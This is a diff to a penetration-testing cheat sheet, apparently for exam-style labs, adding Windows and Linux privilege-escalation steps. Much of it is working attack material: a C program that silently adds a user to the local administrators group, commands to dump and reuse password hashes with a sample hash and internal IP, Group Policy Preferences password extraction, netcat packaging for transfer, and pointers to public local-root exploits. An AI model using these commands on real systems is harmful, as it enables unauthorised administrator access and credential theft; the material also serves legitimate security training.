@@ -1,5 +1,5 @@
-# This is an example < h1 > <h1> tag
-## This is an < h2 > <h2> tag
+# This is an example < h1 <h1> tag
+## This is an  < h2 <h2> tag
 ###### This is an <h6> tag
 
 
@@ -229,3 +229,57 @@ Execution
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
 ```
 ### Debug.exe
+for 32 bit systems, with 64k byte size limit for file creation
+```
+upx -9 nc.exe 
+wine exe2bat.exe nc.exe nc.txt
+```
+todo
+
+## Privilege escalation - Windows
+### Exploits
+* MS11-080 - Windows XP, Windows 2003 Adf.sys 
+	* http://www.exploit-db.com/exploits/18176/ MS11-080
+		* ``` python pyinstaller.py --onefile ms11-080.py ```
+### Misconfiguration
+* icalcs
+	* detects insecure permissions
+		* ```icalcs binary-name.exe```
+```C 
+// file useradd.c
+#include <stdlib.h>
+ /* system, NULL, EXIT_FAILURE */
+int main ()
+{
+	int i;
+	i = system ("net localgroup administrators low /add");
+	return 0;
+}
+```
+		* ```i686-w64-mingw32-gcc -o filename.exe useradd.c ```
+* fgdump.exe / pwdump.exe
+	* A utility for dumping passwords on Windows NT/2000/XP/2003 machines 
+	* https://github.com/interference-security/kali-windows-binaries/tree/master/fgdump
+* Windows Credential Editor (WCE)
+	* obtain cleartext passwords and hashes from a compromised Windows host
+	* ``` wce_protected.exe –w ```
+* pass the hash
+```bash  
+export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
+pth-winexe -U administrator% //10.11.01.76 cmd
+```
+* Windows Group Policy Preferences
+```cmd
+net use z: \\dc01\SYSVOL
+dir /s Groups.xml
+copy Z:\DOMAIN-NAME-TO-CHANGE\Policies\{...}\Machine\Preferences\Groups\Groups.xml C:\Users\mike.DOMAIN-NAME-TO-CHANGE\Documents
+type A Groups.xml
+```
+```bash
+gpp-decrypt
+```
+
+
+## Privilege escalation - Linux
+* Mempodipper - Linux Local Root for >=2.6.39, 32-bit and 64-bit (Ubuntu 11.10, 32 bit CVE 2012-0056)
+	* http://www.exploit-db.com/download/18411 Mempodipper
